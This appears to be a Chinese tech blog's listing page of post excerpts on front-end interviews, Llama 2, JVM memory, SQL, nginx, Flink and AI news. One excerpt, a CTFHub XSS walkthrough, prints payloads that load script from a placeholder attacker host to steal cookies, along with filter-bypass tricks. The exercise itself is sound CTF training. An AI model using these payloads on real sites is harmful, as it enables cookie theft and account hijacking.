与设计师和后端开发人员定期沟通，确保需求理解一致。协同开发，使用Git进行代码版本控制，定期合并和解决冲突。在团队中分享前端技术和经验，促进团队技术整体提升。遇到团队协作问题时，及时与团队成员沟通，寻求解决方案。定期进行项目总结和回顾，识别问题并提出改进建议，推动团队不断成长。 问题六：描述一次你在前端项目中遇到的难题并解决的过程。 在一个前端项目中，我曾遇到过兼容性挑战的问题。特别是在移动端和不同浏览器上，页面显示效果存在差异。为了解决这个问题，我采取了以下步骤：
首先，使用浏览器开发者工具和模拟器检查页面各元素的布局和样式，确定差异所在。接着，针对不同浏览器和设备，编写相应的CSS样式和媒体查询以适配不同分辨率和屏幕尺寸。使用现代化的CSS和JavaScript库（如flexbox、CSS Grid和Normalize.css等）来统一页面显示效果和行为。最后，进行多浏览器和多设备的测试，并根据测试结果进行调整和优化，确保一致的用户体验。 通过这些步骤，我成功解决了兼容性挑战，确保了项目在各个浏览器和设备上的显示效果一致性。
问题七：如何优化前端项目的 SEO？ 在前端项目中，优化SEO可以提升网站的搜索引擎排名和流量。为了实现这个目标，我会采取以下策略：
使用语义化的HTML结构，正确使用标题、段落和列表等标签，让搜索引擎更好地理解页面内容。合理设置网页的meta标签，包括页面描述、关键词和作者等，提供给搜索引擎更多有关页面的信息。优化网页加载速度，通过压缩CSS和JavaScript文件、优化图片等方式提高页面加载速度。增加页面内部链接和外部链接，提升页面之间和与其他网站之间的连接度，增加页面被搜索引擎抓取的可能性。创建网站地图（sitemap），向搜索引擎提供网站结构和页面信息，方便搜索引擎抓取和索引网站内容。关注网站的外部链接建设，通过与其他相关网站的合作和推广，增加网站的外部链接质量和数量。 通过综合这些优化策略，我能够有效提升前端项目的SEO，从而增加网站的曝光和流量。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f406389002d98f4b27b8eaaaccd2aede/" rel="bookmark">
			一文读懂Llama2的架构和推理过程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		01 Llama 2简介 为了更深入了解Llama 2，我们从Meta官网探寻了一些基本信息：
· Llama 2，作为Llama的下一代版本，推出了三种尺寸供选择：7B、13B和70B。其中，7B和13B沿用了Llama 1的经典架构，而70B模型则采用了创新的分组查询注意力（GQA）架构。
· 在预训练数据方面，Llama 2的表现颇为出色。相较于Llama 1，Llama 2的预训练语料增加了40%，这使得模型能够在更丰富的语境中学习。更令人惊艳的是，预训练模型在2万亿个标记上进行了训练，且上下文长度是Llama 1的两倍。而经过微调的模型，也在超过100万条人工标注的数据上进行了精进训练。
进一步观察了Llama 2模型的评估性能，发现它在许多外部基准测试中都优于其他开源语言模型。这些测试涵盖了推理、编码、熟练度和知识等多个方面。
优化后的Llama 2展现出的卓越表现让人对其架构产生了浓厚兴趣。下面，我们将深入探索Llama 2模型的架构，以揭示其强大的能力背后的秘密。
02 Llama 2模型的整体结构 在深入探讨Llama 2的架构之前，我们先来对比一下传统的Transformer架构和Llama 2的架构，以便更好地理解其创新之处。
与传统的Transformer架构相比，Llama 2架构具有以下独特的特点：
1、取消Encoder，仅保留Decoder：这一设计使得模型结构更为简洁，专注于生成和解码任务。
2、采用RMSNorm并将Norm前置：这种归一化方式有助于提高模型的训练稳定性和收敛速度。
3、在Q和K上使用RoPE旋转式位置编码：这种位置编码方式能够更好地捕捉序列中的位置信息，提高模型的表达能力。
4、使用causal mask确保每个位置只能看到前面的tokens：这保证了模型在生成文本时，每个位置只依赖于前面的tokens，符合语言生成的因果性。
5、更早地将K、V拼接到当前K、V前面：这使得模型能够利用更多的上下文信息，提高文本生成的一致性和连贯性。
6、Llama 2使用了Group query attention来节省cache：这一优化减少了模型的计算量和内存占用，提高了模型的效率。
下面我们详细解释下Llama 2架构中各部分功能：
2.1 Tokenizer Llama 2架构中的Tokenizer组件负责将输入的文本语句进行分词和编码。
分词是指将连续的文本拆分成一个个独立的词汇单元，而编码则是将这些词汇单元转换为模型能够处理的整数表示。Llama 2使用了专门的分词表（tokenizer.json）来定义词汇与整数之间的映射关系。
具体来说，当我们输入一串语句给Llama 2模型进行推理时，Tokenizer首先会根据分词表将语句中的词拆分成对应的整数序列。这些整数序列将作为模型的输入，经过模型的计算后，输出的也是整数序列。推理结束后，需要再次使用分词表将这些输出整数转换回原始的词汇，形成最终的推理结果句子。
举个例子来说，当我们输入语句“南京市长江大桥”，Tokenizer会将其分词为“南京市”、“长江”和“大桥”，并将这些词汇转换为对应的整数。模型经过计算后，输出的也是一组整数。推理结束后，再次使用分词表将这些整数转换回词汇，得到最终的推理句子。这样，我们就能够理解Llama 2如何处理输入文本，以及如何将模型的输出转换回可读的句子形式。
2.2 Token Embedding Token Embedding负责将输入的整数序列转换为高维的特征向量表示。
在完成分词和编码后，每个词汇都被表示为一个整数。然而，模型需要将这些整数转换为更具表达能力的向量形式，以便能够捕获词汇之间的语义关系和特征信息，Token Embedding通过查找一个预定义的嵌入表（Embedding table）来实现这一转换过程。该嵌入表将每个整数映射到一个高维（dim维）的特征向量。这样，每个输入的词汇都被映射到一个稠密的向量空间中，这个向量空间能够更好地捕捉词汇的语义信息和上下文关系。
通过Token Embedding，Llama 2能够将输入的整数序列转换为模型可以处理的向量表示，从而为后续的计算提供了更加丰富和表达能力的输入特征。
2.3 RMSNorm 在完成Token Embedding之后，RMSNorm组件负责对输入的向量数据进行归一化处理。
归一化是一种常见的数据预处理技术，它可以将输入的向量数据进行缩放，使其期望值为0，标准差为1。这样做有助于加快模型的收敛速度，提高模型的性能。
RMSNorm是一种特定的归一化方法，它采用了均方根（Root Mean Square）的方式来计算缩放因子。通过对输入向量进行RMSNorm处理，可以使得不同尺度的特征具有相同的权重，从而提高了模型的稳定性和泛化能力。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f406389002d98f4b27b8eaaaccd2aede/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a57d370247c223c3634c75f4d607e40b/" rel="bookmark">
			tongweb生成hprof文件并结合Memory Analyzer Mat分析内存溢出（by lqw）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		什么是堆 JVM中的堆（Heap）是Java虚拟机管理的内存中的一部分，它用于存储所有的Java对象实例。堆内存被所有线程共享，其目的是为了存放对象实例和数组。
堆的大小在JVM启动时就已经设定好了，大家可以通过选项 “-Xmx” 和 "-Xms"来进行设置。
“-Xms” 用于表示堆区的起始内存，等价于 -xx:InitialHeapSize。“-Xmx” 用于表示堆区的最大内存，等价于 -xx:MaxHeapSize。 一旦堆区中的内存大小超过"-xmx"所制定的最大内存时，将会抛出outofMemoryError异常。
通常会将-Xms 和 -Xmx两个参数配置相同的值，其目的是为了能够在Java垃圾回收机制清理完堆区后不需要重新分隔计算堆区的大小，从而提高性能。
默认情况下：
初始内存大小：物理电脑内存大小/64最大内存大小：物理电脑内存大小/4 什么是年轻代和老年代 堆内存按照对象的生命周期进行划分为几个区域：
年轻代（Young Generation）：新创建的对象首先被分配在年轻代。年轻代包含Eden区以及两个幸存区（Survivor spaces，通常简称S0和S1）。
老年代（Old Generation）：对象在年轻代中存活了一定的垃圾收集循环后，如果还没有被回收，那么会被移动到老年代。老年代的大小通常远大于年轻代，并且垃圾回收在老年代中发生的频率较低。
永久代/元数据空间（Metaspace）：JDK 8开始使用元数据空间代替了永久代，这部分用于存储类的元数据信息。它位于堆外内存（native memory）。
堆的大小和垃圾收集的方式直接影响了Java程序的性能。垃圾收集器会自动管理堆内存，回收不再使用的对象所占用的空间，从而避免内存泄露。通过使用jstat命令，开发者可以监控并调整堆的大小和监控垃圾收集的性能，以优化Java应用的效率。
Java7及之前堆内存在逻辑上分为三部分：新生区 + 养老区 + 永久区
Young Generation Space 新生区 Young/New 又被划分为Eden区和Survivor区Tenure generation space 养老区 Old/TenurePermanent Space 永久区 Perm
Java 8及之后堆内存逻辑上分为三部分：新生区 + 养老区 + 元空间
Young Generation Space 新生区 Young/New 又被划分为Eden区和Survivor区Tenure generation space 养老区 Old/TenureMeta Space 元空间 Meta
约定：新生区 -&gt; 新生代 -&gt; 年轻代 、 养老区 -&gt; 老年区 -&gt; 老年代、 永久区 -&gt; 永久代
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a57d370247c223c3634c75f4d607e40b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6dc004a48766355579965344dd8401ab/" rel="bookmark">
			通过 Java 中 5 种流行的方法提取电子邮件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在开发电子邮件处理应用程序时，建立一种从收件箱中提取消息的有效机制对于可靠、及时的传递和可访问性至关重要。处理不断增长的传入消息的组织和企业尤其赞赏它。在本文中，我们将探讨如何利用 Java 库的强大功能，通过 POP3、IMAP、EWS、Graph API 以及以 pst 文件为示例从各种格式的离线邮箱存储中检索电子邮件。这些方法为电子邮件检索提供了全面的解决方案，增强了 Java 应用程序的功能。
Aspose.Email 是用于轻松的开发 email 功能的应用程序的一组控件，基于 ASP.NET 的Web应用、Web服务和Windows 应用。支持 Outlook PST, EML, MSG, and MHT 格式. 允许开发者直接与 SMTP, POP, FTP, 和 MS Exchange 服务器进行工作。支持邮件合并、行事历、定制邮件标题和内容、嵌入文件等，Aspose API支持流行文件格式处理，并允许将各类文档导出或转换为固定布局文件格式和最常用的图像/多媒体格式。
Aspose.Email 最新下载https://www.evget.com/product/3081/download
用于提取消息的 Java API 要从 Java 中的服务器或邮箱存储中提取消息，我们将使用Aspose.Email for Java。Aspose.Email 是一个强大的库，使 Java 开发人员能够轻松地使用电子邮件、文件夹和邮件服务器。它支持多种电子邮件格式，包括 MSG、EML、PST 和 OST，使其成为电子邮件相关任务的多功能选择。如果您使用以下 Maven 配置下载或安装该 API，则可以轻松地将 API 实施到您的项目中。
存储库：
&lt;repository&gt; &lt;id&gt;AsposeJavaAPI&lt;/id&gt; &lt;name&gt;Aspose Java API&lt;/name&gt; &lt;url&gt;http://repository.aspose.com/repo/&lt;/url&gt; &lt;/repository&gt; 依赖关系：
&lt;dependency&gt; &lt;groupId&gt;com.aspose&lt;/groupId&gt; &lt;artifactId&gt;aspose-email&lt;/artifactId&gt; &lt;version&gt;23.11&lt;/version&gt; &lt;classifier&gt;jdk16&lt;/classifier&gt; &lt;/dependency&gt; 通过 POP3 检索电子邮件 POP3（邮局协议 3）是一种广泛使用的电子邮件检索协议。它允许您将电子邮件从邮件服务器下载到本地设备。借助 Aspose.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6dc004a48766355579965344dd8401ab/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a5886224687bdaeef51cdeefdee618ab/" rel="bookmark">
			电子科技大学-数据库系统-期末汇总-完全体（概念&#43;图片&#43;习题&#43;代码）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		写在前面 从2023年开始，学院对各课程考核题型形式提出了统一要求，取消单选题、判断题的测试形式，更多采用综合考核能力的题型形式。
所用教材：数据库系统原理
本篇博客主要记录的是老师PPT上的重点。个人复习使用，仅供参考。由于某些老师后来给画了重点，就又删减了少许。
对于电子科大的朋友，如果你们任课老师给了复习要点，跟着复习要点有针对性的复习就行。
完整MARKDOWN文件
一、数据库及其系统概念 了解数据库、数据库管理系统、数据库系统等基本概念理解数据模型与数据库类型关系熟悉数据库系统组成及其各部分作用 数据库：按特定数据模型组织存储管理数据的文件集合
特点
数据不重复支持并发数据结构独立于应用程序数据的增删改查由数据库系统管理软件管理 数据模型：事物对象数据特征结构的形式化表示，包括数据结构、数据操作、数据约束
数据结构：对象静态特征
数据操作：对象动态特征
数据约束：数据结构中数据之间的联系制约关系，数据动态变化的规则
数据模型-关系数据模型：采用“二维表”结构组织、存储和管理数据，并以关联列实现表之间的联系。
数据库系统（DS）
数据库应用程序：在DBMS支持下对数据库中数据进行访问处理
关系数据库数据内容：用户表（用户数据），系统表（元数据、索引数据、运行数据）
关系数据库对象组织：
用户表：存储用户的应用数据系统表：存储数据库系统自身数据视图：通过虚拟表实现数据查询处理索引：通过目录数据结构支持快速的数据查询约束：对关系表及其数据施加规则存储过程：在数据库内部实现特定功能程序的数据处理触发器：在数据库内部实现数据操作事件触发自动执行的过程程序 二、关系模型 2.1 关系相关概念 键：关系中可以唯一标识元组的属性列，其他的为非键列
候选键：多个列都可以作为键时，它们每一个均为候选键
主键：候选键中最具代表性的，唯一
复合键：关系中必须用多列才能唯一标识元组时，为复合主键
代理键：DBMS自动生成的数字序列主键，可替代复合主键
外键：关系中的关键字为另一个关系的主键，此时称该关系为另一个关系的从表
关系模式：关系名（主键属性，属性2，…，属性x）
2.2 关系模型原理 数据模型-关系模型：基于二维表结构存储数据实体及实体间联系
关系模型数据操作
集合：选择（select）、投影（project）、连接（join）、交（intersection）、并（union）、差（difference）
元组：行插入（Insert）、 修改（Update）、删除（Delete）
交并差：关系R与关系S需有相同属性组成（简单不赘述）
笛卡尔积×：R的属性列+S的属性列=新表属性列，元组进行排列组合
选择：σF®：在关系R中选出满足条件F的元组形成新的关系。(F：条件表达式)；对应where子句
投影：πA（R）：在R中选出若干属性列组成一个新关系。(A:属性组)；对应select子句
连接：从两个关系的笛卡尔积中选取属性间满足条件AθB的元组组成新的关系
条件连接
等值连接-条件连接的特例：选取指定属性列的值相等的行，可以选择多个条件
SELECT 列表 FROM 表1 JOIN 表2 ON 表1.列 = 表2.列; 自然连接-等值连接的特例：根据两个表中的所有相同属性列进行连接，连接后多个的相同属性列只保留一个
SELECT 列表 FROM 表1 NATURAL JOIN 表2; 外连接-自然连接的特例：自然连接只有相同属性列的值相同才返回，外连接中若有一方的行的共同属性列没有找到与之匹配的行，则也保留该行，以NULL填充。左外连接、右外连接、全外连接
除（了解；t代表元组、XY代表属性）
关系模型完整性约束：实体完整性约束（主键非空且不唯一）、参照完整性约束（主从表的外键主键一致）、用户自定义完整性约束
三、SQL语句 3.1 sql概述 数据定义语言（DDL）：创建修改删除数据库对象；create/drop/alter database/table/index
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a5886224687bdaeef51cdeefdee618ab/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/55259f44fcac7f77a326631046ebd718/" rel="bookmark">
			CTFHub技能树web之XSS
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在XSS系列的题目中，由于需要使用能够接受XSS数据的平台，并且由于使用的是CTFHub的模拟机器人点击我们的虚假URL，因此使用的XSS平台不能是自己本地搭建的，如果是本地的模拟点击的机器人将无法访问我们给的这个URL地址，也就无法接收到我们想要的数据了，因此想解决本系列的题目，可以通过在线XSS平台或者自己使用服务器搭建一个XSS平台。
由于在线XSS平台需要收费，想起自己有一个一直没用的阿里云轻量服务器，就自己搭建了一个XSS平台。如果想做这个系列的题目，可以自己搭建一个XSS接受平台或者是用在线的平台。
第一题：反射型
首先验证是否存在XSS漏洞，在上面的框中输入，页面正常回显，说明存在XSS漏洞利用
使用蓝莲花BLUE-LOTUS的XSS接收平台能够生成payload，直接复制粘贴到第一个框中并上传，将上传后的url复制粘贴到第二个框中并点击上传，就可以收到XSS的数据了，flag就在cookie中
第二题：存储型
打开靶场，和第一题一样将payload粘贴到第一个框中并点击上传
上传后将当前url粘贴到第二个框中，点击发送
在XSS平台接收面板中即可看到数据内容，flag仍然在cookie中
第三题： DOM反射
根据第一个框中的内容在源码中查看对应的位置
可以看到可控的位置在53-55行中的这个位置，先闭合前面的单引号和&lt;script&gt;，然后再用一个&lt;script&gt;输入XSS代码，构造语句如下';&lt;/script&gt;&lt;script src=http://xx.xx.xx.xx/xss/myjs/default.js//
第四题：DOM跳转
根据题目代码分析，当传入的参数为jumpto的时候会跳转到相应的页面，利用
javascript:$.getScript语法可以传入自己的XSS平台地址实现XSS，构造语句如下 ?jumpto=javascript:$.getScript("//xx.xx//xx") 第五题：过滤空格
将payload中空格用/**/代替，即可成功XSS
第六题：过滤关键词
可以使用经典的双写绕过方法进行绕过
&lt;script src="http://xx.xx.xx.xx/xss/myjs/default.js"&gt;&lt;/script&gt;
改为&lt;sscriptcript src="http://xx.xx.xx.xx/xss/myjs/default.js"&gt;&lt;/sscriptcript&gt;，当开头和结尾的script被检测出并删除后剩下的字母仍然可以拼成一个script并实现XSS
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fe1d0fc61bf99b63b5b126e60d651270/" rel="bookmark">
			nginx.conf配置文件详解、案例，Nginx常用命令与模块
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、Nginx常用命令
二、Nginx涉及的文件
2.1、Nginx 的默认文件夹
2.2、Nginx的主配置文件nginx.conf nginx.conf 配置的模块
2.2.1、全局块：全局配置，对全局生效
2.2.2、events块：配置影响 Nginx 服务器与用户的网络连接
2.2.3、http块：配置代理，缓存，日志定义等绝大多数功能和第三方模块的配置
2.2.4、server块：配置虚拟主机的相关参数
2.2.5、location块：用于配置匹配的 uri
实验：基于域名和授权访问控制和端口的nginx
2.3、Nginx的四大模块——proxy、headers、upstream、stream模块
本篇使用源代码编译安装的方式安装 nginx ，并未用包管理器安装（即在 CentOS 上使用 yum 或是 Ubuntu 上使用 apt-get 直接安装）。
安装nginx： Nginx的介绍、自定义编译安装Nginx-CSDN博客
一、Nginx常用命令 nginx：打开 Nginx Web 服务器。
nginx -h：显示 Nginx 的帮助信息。
nginx -v：显示 Nginx 版本并退出。
nginx -V：显示 Nginx 版本和配置选项，然后退出。
nginx -t：测试配置文件并退出（较为常用）。
nginx -T：测试配置文件并将其转储到控制台（标准输出），然后退出。
nginx -q：在测试配置文件时禁止显示非错误消息。
nginx -s signal：向主进程发送信号（停止、退出、重新打开、重新加载）。
nginx -p prefix：设置 Nginx 的前缀路径（默认为 /etc/nginx/）。
nginx -e filename：设置错误日志文件的路径（默认为 /var/log/nginx/error.log）。
nginx -c filename：设置配置文件的路径（默认为 /etc/nginx/nginx.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fe1d0fc61bf99b63b5b126e60d651270/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/239a2ae2309d1aa0dc78168576aaeec3/" rel="bookmark">
			【Flink CDC（一）】实现mysql整表与增量读取
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一. 运行前准备1. 依赖1.1. Maven dependency1.2. SQL Client JAR（推荐） 2. 配置 MySQL 服务器（必须） 二. 功能说明1. 启动模式2. 全量阶段支持 checkpoint3. 关于无主键表Exactly-Once 处理 三. 实战1. 实现mysql整表与增量表同步 FAQ MySQL CDC 连接器允许从 MySQL 数据库读取快照数据（比如：flink任务消费时刻的整表数据）和增量数据。本文描述了如何设置 MySQL CDC 连接器来对 MySQL 数据库运行 SQL 查询。
本篇只关注mysql整表与增量读取的实现，对于并发读取等能力后续再探索。
一. 运行前准备 1. 依赖 1.1. Maven dependency &lt;dependency&gt; &lt;groupId&gt;com.ververica&lt;/groupId&gt; &lt;artifactId&gt;flink-connector-mysql-cdc&lt;/artifactId&gt; &lt;!-- 请使用已发布的版本依赖，snapshot版本的依赖需要本地自行编译。 --&gt; &lt;version&gt;2.4.0&lt;/version&gt; &lt;/dependency&gt; 1.2. SQL Client JAR（推荐） 下载 flink-sql-connector-mysql-cdc-2.4.0.jar 到 &lt;FLINK_HOME&gt;/lib/ 目录下。
2. 配置 MySQL 服务器（必须） 你必须定义一个 MySQL 用户，该用户对 MySQL CDC 连接器监视的所有数据库都应该具有所需的权限。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/239a2ae2309d1aa0dc78168576aaeec3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/52cb5f521b7077fde8778894c7e75f4f/" rel="bookmark">
			SpringBoot集成支付宝沙箱支付
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 提示：SpringBoot集成支付宝沙箱支付简单版 后续可根据实际情况结合其它功能
一、注册支付宝沙箱 直达链接：登录 - 支付宝
二、使用步骤 1.引入pom文件 &lt;!-- 支付宝支付依赖 --&gt; &lt;dependency&gt; &lt;groupId&gt;com.alipay.sdk&lt;/groupId&gt; &lt;artifactId&gt;alipay-sdk-java&lt;/artifactId&gt; &lt;version&gt;4.31.56.ALL&lt;/version&gt; &lt;/dependency&gt; 2.配置yml 代码如下（示例）：
alipay: app-id: APPID private-key: 你的私有密钥（应用私钥） alipay-public-key: 公有密钥（支付宝公钥） server-url: https://openapi-sandbox.dl.alipaydev.com/gateway.do charset: utf-8 sign-type: RSA2 notify-url: http://mkcaa9.natappfree.cc/alipay/notify(填写你的地址+/alipay/notify) return-url: http://mkcaa9.natappfree.cc/alipay/returnUrl(支付成功回调的地址) 私有密钥和公有密钥在开发信息下公钥模式查看，地址不懂得先看3配置地址映射
3.配置地址映射 最好映射一下本地地址 可以公共访问 直达链接-》NATAPP-内网穿透 基于ngrok的国内高速内网映射工具
免费注册实名-》购买一个免费的
配置端口映射
下载 解压 配置
双击启动start.bat
三、Java类 1. AliPayController.Java import com.alibaba.fastjson.JSONObject; import com.alipay.api.AlipayApiException; import com.alipay.api.AlipayClient; import com.alipay.api.DefaultAlipayClient; import com.alipay.api.internal.util.AlipaySignature; import com.alipay.api.request.AlipayTradePagePayRequest; import com.xdong.shopping.dao.pojo.ShoppingDd; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.beans.factory.annotation.Value; import org.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/52cb5f521b7077fde8778894c7e75f4f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f35f69aafcd9d9cad55ebfb7841c1247/" rel="bookmark">
			大数据超全面入门干货知识，看这一篇就够了！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		随着科技的飞速发展和互联网的普及，大数据已成为 21 世纪最炙手可热的话题之一。它像一面神秘的面纱，覆盖着现实世界，隐藏着无穷无尽的可能性。今天将带领大家一起揭开大数据这个未知世界的神秘面纱，带你了解大数据的概念、应用以及大数据相关组件。
一、什么是大数据 大数据是指规模巨大、类型复杂且增长迅速的数据集合。这些数据无法通过传统的数据管理和处理工具进行捕捉、存储、管理和分析。
大数据的特点可以概括为“四V”：
Volume（大量）：数据容量和复杂性使传统工具和技术已无法处理
Velocity（高速）：增长速度快，处理速度快
Variety（多样性）：人对人；人对机器；机器对机器
Value（价值）：创造价值高，价值密度低
通过大数据分析，我们可以从海量的数据中挖掘出有价值的信息，为决策提供有力支持。
二、大数据的应用领域 商业智能和市场营销：企业可以通过大数据分析深入了解消费者需求和行为模式，从而制定更加精准的市场营销策略，提升产品和服务的竞争力。
健康医疗：利用大数据分析可以对医疗数据进行挖掘，辅助医生进行诊断和治疗，提高医疗效率和患者治愈率。
金融服务：银行和金融机构可以利用大数据分析进行风险评估、欺诈检测以及个性化推荐，提供更加安全和便捷的金融服务。
城市规划：城市可以通过大数据分析优化交通管理、资源配置和环境保护，提升城市的可持续发展和居民生活质量。
三、大数据相关组件介绍 在大数据的世界里，有许多神奇的组，它们像齐心协力的小伙伴，一起为我们揭开数据的奥秘。接下来让我们介绍一下这些组件吧！ 3.1 Hadoop
Hadoop 就像一个超级大仓库，可以存放海量的数据，并帮助我们进行高效处理。它是一个开源的分布式计算框架，让数据分散储存在多台计算机上，然后使用 MapReduce 的方法，将数据分成小块一块一块地处理，最后把结果汇总起来。Hadoop 可以高效地处理大量的数据，让我们轻松面对海量信息的挑战。
Hadoop-MapReduce 工作流程图 流程图模板_ProcessOn思维导图、流程图https://www.processon.com/view/62bcf2827d9c08073522dd0e
MapReduce2.x YARN 工作流程图 流程图模板_ProcessOn思维导图、流程图https://www.processon.com/view/62c038edf346fb66f499eb69
3.2 Hive
Hive 就像是一个大数据魔法师，它可以将我们熟悉的 SQL 语言与大数据结合起来。有了 Hive，我们不需要学习新的编程语言，只需使用熟悉的 SQL，就能轻松地查询和分析海量的数据。Hive 会将 SQL 转换成 Hadoop 能够理解的 MapReduce 任务，让我们用得更加得心应手。
​编辑▲Hive架构https://www.processon.com/view/62e64bd35653bb0716178909
3.3 Spark
Spark 是 Hadoop 的好搭档，它像是个速度飞快的数据处理快车。与 Hadoop 相比，Spark 更擅长内存计算，这意味着它能更快地处理数据。Spark 支持各种复杂任务，如流式处理、机器学习和图形计算等，为我们提供更多可能性。它的快速处理能力让我们在大数据领域行驶如风！
Spark 运行架构 流程图模板_ProcessOn思维导图、流程图https://www.processon.com/view/63418a6507912921d8042a53
3.4 HBase
HBase 是一个分布式数据库，它像是一个超大号的表格，可以存储非结构化数据，也可以让非结构化数据配合Phoenix实现SQL操作。与传统的数据库不同，HBase 可以轻松应对海量的数据，而且还具备高可扩展性和高容错性。它通常用于存储非结构化数据，比如日志和社交媒体数据，为我们提供了一个强大的数据存储工具。
HBase 架构 流程图模板_ProcessOn思维导图、流程图https://www.processon.com/view/630afe5663768906ff69458f
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f35f69aafcd9d9cad55ebfb7841c1247/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/61a56a2f39c6c088cf2e56b1d7eaea9c/" rel="bookmark">
			大批量数据，用mysql批量更新数据的四种方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		建一个测试表
create table users ( id int auto_increment primary key, name varchar(255) null, age int null ); 1 replace into 批量更新【谨慎用】
/** 没有就新增，id一样，就修改 特别注意：每列数据都要写上，不然就会设为null,你就惨了 */ replace into users (id,name,age) values (1,'aa',20),(2,'bb',30),(3,'cc',40); /* 找死 */ replace into users (id,age) values (1,21),(2,31),(3,41); /* 正确写法 */ replace into users (id,name,age) values (1,'aa',21),(2,'bb',31),(3,'cc',41); 2 insert into ...on duplicate key update批量更新
/** 执行第一次：（首次数据库表中没有数据，正常插入） */ insert into users (id,name,age) values (1,'aa',20),(2,'bb',30),(3,'cc',40) on duplicate key update age=age+1; /** 没有就新增，id一样，就修改，age 列都加1 */ insert into users (id) values (1),(2),(3) on duplicate key update age=age+1; /** 将 name 从 'aa' ,改为 'aa-1', age加1 */ insert into users (id,name) values (1,'aa-1'),(2,'bb-1'),(3,'cc-1') on duplicate key update name=values(name) ,age=age+1; /** 将 name 从 ‘aa-1’ 改为 'xiaowang' age 改为 10 ,以此类推 */ insert into users (id,name,age) values (1,'xiaowang',10),(2,'xiaoming',15),(3,'xiaochen',20) on duplicate key update name=values(name),age=values(age); 3 创建临时表，先更新临时表，然后从临时表中update
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/61a56a2f39c6c088cf2e56b1d7eaea9c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a962ecd08a88d811299a09d91427d54b/" rel="bookmark">
			上热榜了！抖音博主被曝用AI作品欺骗观众；看看Sora炸出来多少好东西；我帮你踩遍了AIGC创业的各种坑；图解 Stable Diffusion | ShowMeAI日报
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		👀日报&amp;周刊合集 | 🎡生产力工具与行业应用大全 | 🧡 点赞关注评论拜托啦！
👀 抖音知名绘画博主被曝作品是AI制作的，然后道歉也是 ChatGPT 生成的？ 2月21日，抖音知名绘画博主 @曾bobi 发布了最新作品，是他们几名美院学生根据「你有高速运转的机械进入中国……黄龙江一派全都带蓝牙……」抽象热梗进行的绘画。
视频内容显示，在经过几人一番「肝疼」的创作后，最终作品也的确是……更抽象了…… (👆 如上图所示)
本以为这就是一个热梗创作，结果越来越多的博主开始指出，这幅画是由AI生成的，博主在骗人！毕竟 @曾bobi 在视频中丝毫没有提及AI参与创作的事情，还用几人正在创作场景引导观众以为这是他们手绘的作品。
本次「露馅儿」的主要原因，还是画作左上角其中一个人物的7根手指。手指数量不正确是AI绘画最常见的漏洞之一，没想到成了这次抓包的关键证据。
@曾bobi 随后发布了道歉声明，狡辩之词先搁在一边不说，有观众根据遣词造句的蛛丝马迹扒出，这份道歉稿也是AI生成的！几轮发酵还把这件事推上了抖音热榜。
嘶… 这后续就比较难搞了啊…
🉑 看看 Sora 炸出来多少好东西：文生视频 &amp; 文生图最新进展汇总 🔔 Stable Video 官网正式开放公测，号称 Sora 之外最强？ https://stablevideo.com | ⋙ 点击查看演示视频
2月21日，Stability AI 公司的视频生成网站 Stable Video 正式开放公测，所有人都可以注册并体验了。官方非常大方，每日赠送150 个积分 (其中，图片生成视频消耗10个积分，文本生成视频消耗11个积分)。
Stable Video 目前支持「图生视频」「文生视频」两种模式，生成视频长度不超过4秒 (与 Sora 的60秒相形见绌)，并且支持通过相机运动来控制视频的生成过程。
通过官网演示视频和多位博主的测评视频来看，Stable Video 生成的视频质量非常不错，是Runway 强有力的竞争者 ⋙ 详细测评
🔔 CapCut (剪映海外版) 推出文生视频功能 https://www.capcut.com/editor-tools/ai-video-generator | ⋙ 点击查看演示视频
2月21日，CapCut (剪映海外版) 推出了「文生视频」功能，所有人都可以注册体验。生成的视频时长4秒左右，每个账户每天有5次免费生成额度。
	</div>
